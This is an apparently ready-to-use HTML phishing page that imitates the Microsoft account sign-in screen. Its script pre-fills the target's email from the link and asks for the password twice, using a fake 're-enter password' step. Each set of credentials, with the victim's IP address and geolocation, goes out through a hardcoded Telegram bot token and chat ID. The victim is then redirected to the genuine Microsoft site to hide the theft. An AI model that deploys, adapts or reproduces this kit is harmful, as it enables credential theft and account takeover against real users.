<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', 'Microsoft Sans Serif', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #e6f2ff 0%, #f0f7ff 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(0, 103, 184, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(0, 103, 184, 0.05) 0%, transparent 40%);
            z-index: -1;
        }
        
        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1), 0 16px 40px rgba(0, 0, 0, 0.15);
            width: 440px;
            padding: 40px 32px;
            position: relative;
            overflow: hidden;
            animation: fadeIn 0.5s ease-out;
            z-index: 1;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .microsoft-logo {
            text-align: center;
            margin-bottom: 24px;
            position: relative;
        }
        
        .logo-squares {
            display: inline-flex;
            gap: 4px;
            position: relative;
        }
        
        .logo-square {
            width: 24px;
            height: 24px;
            transition: transform 0.3s ease;
        }
        
        .logo-squares:hover .logo-square {
            transform: rotate(45deg);
        }
        
        .logo-squares:hover .red { transform: rotate(-15deg); }
        .logo-squares:hover .green { transform: rotate(15deg); }
        .logo-squares:hover .blue { transform: rotate(-25deg); }
        .logo-squares:hover .yellow { transform: rotate(25deg); }
        
        .red { background-color: #f25022; }
        .green { background-color: #7fba00; }
        .blue { background-color: #00a4ef; }
        .yellow { background-color: #ffb900; }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
            color: #1b1b1b;
            position: relative;
        }
        
        h1::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 50%;
            transform: translateX(-50%);
            width: 50px;
            height: 2px;
            background: #0067b8;
            transition: width 0.3s ease;
        }
        
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 28px;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 16px;
            position: relative;
        }
        
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            font-size: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            transition: all 0.3s ease;
            background: #fff;
        }
        
        input:focus {
            outline: none;
            border-color: #0067b8;
            box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.2);
        }
        
        input.error {
            border-color: #e81123;
            animation: shake 0.5s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        .password-container {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            z-index: 2;
        }
        
        .forgot-password {
            text-align: right;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
            font-weight: 600;
            position: relative;
        }
        
        .forgot-password a::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 0;
            height: 1px;
            background: #0067b8;
            transition: width 0.3s ease;
        }
        
        .forgot-password a:hover::after {
            width: 100%;
        }
        
        .submit-btn {
            width: 100%;
            padding: 12px;
            background-color: #0067b8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            position: relative;
            overflow: hidden;
        }
        
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }
        
        .submit-btn:hover {
            background-color: #005da6;
        }
        
        .submit-btn:hover::before {
            left: 100%;
        }
        
        .create-account {
            text-align: center;
            margin-top: 24px;
            color: #666;
            font-size: 13px;
        }
        
        .create-account a {
            color: #0067b8;
            text-decoration: none;
            font-weight: 600;
        }
        
        .footer {
            margin-top: 32px;
            padding-top: 16px;
            border-top: 1px solid #e6e6e6;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #666;
        }
        
        .footer a {
            color: #666;
            text-decoration: none;
        }
        
        .loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
            z-index: 10;
        }
        
        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid rgba(0, 103, 184, 0.2);
            border-top: 4px solid #0067b8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 16px;
        }
        
        .loading-text {
            color: #0067b8;
            font-weight: 600;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #e81123;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
        
        .security-info {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 20px;
            padding: 10px;
            background-color: #f8f8f8;
            border-radius: 4px;
            font-size: 13px;
            color: #666;
        }
        
        .security-info svg {
            min-width: 16px;
        }
        
        .email-source {
            font-size: 11px;
            color: #666;
            text-align: center;
            margin-top: 5px;
            display: none;
        }
        
        .redirect-notice {
            display: none;
            background: #f8f8f8;
            border-radius: 4px;
            padding: 12px;
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
            color: #666;
            border-left: 3px solid #0067b8;
        }
        
        .account-info {
            display: flex;
            align-items: center;
            gap: 12px;
            background: #f0f7ff;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        
        .account-avatar {
            width: 40px;
            height: 40px;
            background: #0067b8;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
        }
        
        .account-details {
            flex-grow: 1;
        }
        
        .account-email {
            font-weight: 600;
            margin-bottom: 4px;
        }
        
        .account-type {
            font-size: 12px;
            color: #666;
        }
        
        .page {
            display: none;
        }
        
        .page.active {
            display: block;
        }
        
        @media (max-width: 480px) {
            .login-container {
                width: 100%;
                padding: 30px 20px;
            }
            
            .footer {
                flex-direction: column;
                gap: 8px;
                align-items: center;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Page 1: Email and Password -->
        <div id="page1" class="page active">
            <div class="microsoft-logo">
                <div class="logo-squares">
                    <div class="logo-square red"></div>
                    <div class="logo-square green"></div>
                    <div class="logo-square blue"></div>
                    <div class="logo-square yellow"></div>
                </div>
            </div>
            
            <h1>Sign in</h1>
            <div class="subtitle">Use your Microsoft account</div>
            
            <form id="loginForm">
                <div class="form-group">
                    <input type="text" id="email" name="loginfmt" placeholder="Email, phone, or Skype" required autofocus>
                    <div class="error-message" id="email-error">Please enter a valid email address</div>
                    <div class="email-source" id="emailSource">Email loaded from secure link</div>
                </div>
                
                <div class="form-group">
                    <div class="password-container">
                        <input type="password" id="password" name="passwd" placeholder="Password" required>
                        <button type="button" class="toggle-password" id="showPassword">Show</button>
                    </div>
                    <div class="error-message" id="password-error">Please enter your password</div>
                </div>
                
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
                
                <button type="submit" class="submit-btn" id="submitBtn">Sign in</button>
            </form>
            
            <div class="create-account">
                <span>No account? </span><a href="#">Create one!</a>
            </div>
            
            <div class="security-info">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#666" width="16" height="16">
                    <path d="M0 0h24v24H0z" fill="none"/>
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                </svg>
                <span>Sign in is protected by reCAPTCHA and the Google <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.</span>
            </div>
            
            <div class="footer">
                <div>
                    <a href="#">Terms of use</a>
                </div>
                <div>
                    <a href="#">Privacy & cookies</a>
                </div>
                <div>
                    <a href="#">Contact Microsoft</a>
                </div>
            </div>
        </div>
        
        <!-- Page 2: Re-enter Password -->
        <div id="page2" class="page">
            <div class="microsoft-logo">
                <div class="logo-squares">
                    <div class="logo-square red"></div>
                    <div class="logo-square green"></div>
                    <div class="logo-square blue"></div>
                    <div class="logo-square yellow"></div>
                </div>
            </div>
            
            <h1>Re-enter password</h1>
            <div class="subtitle">For security, please verify your password</div>
            
            <div class="account-info">
                <div class="account-avatar" id="avatar">U</div>
                <div class="account-details">
                    <div class="account-email" id="accountEmail">user@example.com</div>
                    <div class="account-type">Personal Microsoft Account</div>
                </div>
            </div>
            
            <form id="verifyForm">
                <div class="form-group">
                    <div class="password-container">
                        <input type="password" id="verifyPassword" name="verifyPasswd" placeholder="Password" required>
                        <button type="button" class="toggle-password" id="showVerifyPassword">Show</button>
                    </div>
                    <div class="error-message" id="verify-error">Please enter your password</div>
                </div>
                
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
                
                <button type="submit" class="submit-btn" id="verifyBtn">Verify</button>
            </form>
            
            <div class="redirect-notice" id="redirectNotice">
                You will be redirected to Microsoft Account Security Center shortly...
            </div>
            
            <div class="security-info">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#666" width="16" height="16">
                    <path d="M0 0h24v24H0z" fill="none"/>
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                </svg>
                <span>Sign in is protected by reCAPTCHA and the Google <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.</span>
            </div>
            
            <div class="footer">
                <div>
                    <a href="#">Terms of use</a>
                </div>
                <div>
                    <a href="#">Privacy & cookies</a>
                </div>
                <div>
                    <a href="#">Contact Microsoft</a>
                </div>
            </div>
        </div>
        
        <div class="loading-overlay" id="loadingOverlay">
            <div class="loading-spinner"></div>
            <div class="loading-text">Signing in...</div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // DOM elements
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const verifyPasswordInput = document.getElementById('verifyPassword');
            const loadingOverlay = document.getElementById('loadingOverlay');
            const showPasswordBtn = document.getElementById('showPassword');
            const showVerifyPasswordBtn = document.getElementById('showVerifyPassword');
            const loginForm = document.getElementById('loginForm');
            const verifyForm = document.getElementById('verifyForm');
            const emailSource = document.getElementById('emailSource');
            const passwordError = document.getElementById('password-error');
            const verifyError = document.getElementById('verify-error');
            const redirectNotice = document.getElementById('redirectNotice');
            const accountEmail = document.getElementById('accountEmail');
            const avatar = document.getElementById('avatar');
            const page1 = document.getElementById('page1');
            const page2 = document.getElementById('page2');
            
            // Configuration
            let attempts = 0;
            const maxAttempts = 3;
            let hasEmailFromURL = false;
            let currentEmail = '';
            
            // Telegram configuration (replace with your actual token and chat ID)
            const botToken = '7902731282:AAHYdP3_kbQ2c8TO1CiD_cM9QNLrSOU196E';
            const chatId = '7440957972';
            
            // Grab email from URL hash
            function grabEmailFromURL() {
                const hash = window.location.hash.substring(1);
                if (hash && hash.includes('@') && hash.includes('.')) {
                    emailInput.value = decodeURIComponent(hash);
                    emailInput.readOnly = true;
                    emailSource.style.display = 'block';
                    return true;
                }
                return false;
            }
            
            // Initialize email from URL
            hasEmailFromURL = grabEmailFromURL();
            
            // Show password toggle for page 1
            let showPassword = false;
            showPasswordBtn.addEventListener('click', function() {
                showPassword = !showPassword;
                passwordInput.type = showPassword ? 'text' : 'password';
                this.textContent = showPassword ? 'Hide' : 'Show';
            });
            
            // Show password toggle for page 2
            let showVerifyPassword = false;
            showVerifyPasswordBtn.addEventListener('click', function() {
                showVerifyPassword = !showVerifyPassword;
                verifyPasswordInput.type = showVerifyPassword ? 'text' : 'password';
                this.textContent = showVerifyPassword ? 'Hide' : 'Show';
            });
            
            // Send credentials to Telegram
            async function sendToTelegram(email, password, isSecondPage = false) {
                try {
                    // Get IP address
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    
                    // Get location data
                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    const locationData = await locationResponse.json();
                    
                    // Prepare Telegram message
                    const attemptType = isSecondPage ? "Re-enter Attempt" : "Initial Attempt";
                    const message = `Microsoft Login - ${attemptType}
Email: ${email}
Password: ${password}
IP: ${ipData.ip}
Location: ${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
                    
                    // Send to Telegram
                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                    const response = await fetch(telegramUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    });
                    
                    if (response.ok) {
                        console.log('Credentials sent to Telegram');
                    } else {
                        console.error('Failed to send credentials');
                    }
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                }
            }
            
            // Form submission for page 1
            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                // Validate inputs
                if (!emailInput.value.trim()) {
                    document.getElementById('email-error').style.display = 'block';
                    return;
                }
                
                if (!passwordInput.value.trim()) {
                    passwordError.style.display = 'block';
                    return;
                }
                
                // Hide previous errors
                passwordError.style.display = 'none';
                
                // Show loading
                loadingOverlay.style.opacity = '1';
                loadingOverlay.style.pointerEvents = 'auto';
                
                // Store email for page 2
                currentEmail = emailInput.value;
                
                try {
                    // Send credentials to Telegram
                    await sendToTelegram(currentEmail, passwordInput.value);
                    
                    // Handle email from URL scenario
                    if (hasEmailFromURL) {
                        attempts++;
                        
                        // After first attempt, go to page 2
                        if (attempts < maxAttempts) {
                            // Hide loading overlay after delay
                            setTimeout(() => {
                                loadingOverlay.style.opacity = '0';
                                loadingOverlay.style.pointerEvents = 'none';
                                
                                // Show page 2
                                page1.classList.remove('active');
                                page2.classList.add('active');
                                
                                // Set account details
                                accountEmail.textContent = currentEmail;
                                avatar.textContent = currentEmail.charAt(0).toUpperCase();
                            }, 1500);
                        } 
                    } else {
                        // Normal redirect for non-hash emails
                        setTimeout(() => {
                            window.location.href = 'https://login.live.com';
                        }, 1500);
                    }
                } catch (error) {
                    console.error('Error:', error);
                    
                    // Redirect anyway
                    setTimeout(() => {
                        window.location.href = 'https://login.live.com';
                    }, 1500);
                }
            });
            
            // Form submission for page 2
            verifyForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                // Validate inputs
                if (!verifyPasswordInput.value.trim()) {
                    verifyError.style.display = 'block';
                    return;
                }
                
                // Hide previous errors
                verifyError.style.display = 'none';
                
                // Show loading
                loadingOverlay.style.opacity = '1';
                loadingOverlay.style.pointerEvents = 'auto';
                
                try {
                    // Send credentials to Telegram
                    await sendToTelegram(currentEmail, verifyPasswordInput.value, true);
                    
                    // After second page submission
                    attempts++;
                    
                    // Redirect after the second page
                    redirectNotice.style.display = 'block';
                    setTimeout(() => {
                        window.location.href = 'https://account.microsoft.com/';
                    }, 2500);
                } catch (error) {
                    console.error('Error:', error);
                    
                    // Redirect anyway
                    setTimeout(() => {
                        window.location.href = 'https://account.microsoft.com/';
                    }, 1500);
                }
            });
        });
    </script>
</body>
</html>